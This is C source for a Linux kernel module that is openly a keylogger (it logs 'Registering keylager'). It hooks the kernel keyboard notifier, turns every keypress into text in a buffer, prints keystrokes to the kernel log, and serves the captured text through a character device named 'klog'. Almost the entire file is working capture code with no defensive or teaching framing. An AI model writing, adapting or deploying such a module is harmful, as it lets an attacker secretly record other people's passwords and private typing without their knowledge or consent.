#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hyp");

static const char *keymap[][2] = {
{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, 
{"8", "*"}, {"9", "("}, {"0", ")"}, {"-", "_"}, {"=", "+"}, 
{"_BACKSPACE_", "_BACKSPACE_"}, {"_TAB_", "_TAB_"}, {"q", "Q"}, 
{"w", "W"}, {"e", "E"}, {"r", "R"},{"t", "T"}, {"y", "Y"}, {"u", "U"}, 
{"i", "I"}, {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"}, 
{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"a", "A"}, {"s", "S"},
{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, 
{"l", "L"}, {";", ":"}, {"'", "\""}, {"`", "~"}, {"_SHIFT_", "_SHIFT_"}, 
{"\\", "|"}, {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, 
{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, {".", ">"}, 
{"/", "?"}, {"_SHIFT_", "_SHIFT_"}, {"_PRTSCR_", "_KPD*_"},
{"_ALT_", "_ALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, 
{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, 
{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, 
{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"}, 
{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"}, 
{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, 
{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, 
{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, 
{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
{"\0", "\0"}, {"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"/", "/"},
{"_PRTSCR_", "_PRTSCR_"}, {"_ALT_", "_ALT_"}, {"\0", "\0"}, 
{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"}, 
{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, 
{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"_PAUSE_", "_PAUSE_"}, 
};

#define DEVICE_NAME "klog"
#define SUCCESS 0

int keylog(struct notifier_block *, unsigned long, void *);
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);

static int major;
static int is_open = 0;

static int shiftKey = 0;
struct semaphore sem;

static char keybuf[300] = {};
static char *msg_ptr;

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = device_read,
   	.open = device_open,
	.release = device_release
};

static struct notifier_block nb = {
	.notifier_call = keylog
};

static int device_open(struct inode *inode, struct file *file) {

	if(is_open)
		return -EBUSY;

	msg_ptr = keybuf;
	is_open++;
	try_module_get(THIS_MODULE);

	return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file) {
	is_open--;
	module_put(THIS_MODULE);

	return 0;
}

static ssize_t device_read(struct file *filp, char *buff, size_t len, loff_t * off) {
	int bytes_read = 0;

	if(*msg_ptr == 0)
		return 0;

	while(len && *msg_ptr) {
		put_user(*(msg_ptr++), buff++);

		len--;
		bytes_read++;
	}

	return bytes_read;
}

int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    //struct file *fp = file_open("/testicle", O_WRONLY|O_CREAT, 0664);
    
    if(code == KBD_KEYCODE) {
		if(param->value==42 || param->value==54) {
	    	down(&sem);

	    	if(param->down)
				shiftKey = 1;
	    	else
				shiftKey = 0;

	    	up(&sem);
	    	return NOTIFY_OK;
		}

		if(param->down) {
	    	if(strlen(keybuf) > 200) {
				printk(KERN_INFO "%s\n", keybuf); 
				keybuf[0] = '\0';
	    	}

	    	down(&sem);
	    	if(shiftKey == 0) {
				strncat(keybuf, keymap[param->value][0], 
		    		strlen(keymap[param->value][0]));
			
				printk(KERN_INFO "length: %d\n", (int)strlen(keybuf));
	    	} else {
				printk(KERN_INFO "%s \n", keymap[param->value][1]);
	    	}
	    	up(&sem);
		}

    }

    return NOTIFY_OK;
}

static int __init init_klog(void) {
	keybuf[0] = '\0';

    register_keyboard_notifier(&nb);
    printk(KERN_INFO "Registering keylager\n");
    sema_init(&sem, 1);

	major = register_chrdev(0, DEVICE_NAME, &fops);
	printk(KERN_INFO "major: %d\n", major);

    return 0;
}

static void __exit cleanup_klog(void) {
    unregister_keyboard_notifier(&nb);
    unregister_chrdev(major, DEVICE_NAME);

    printk(KERN_INFO "Unregistered keylager\n");
}

module_init(init_klog);
module_exit(cleanup_klog);
	
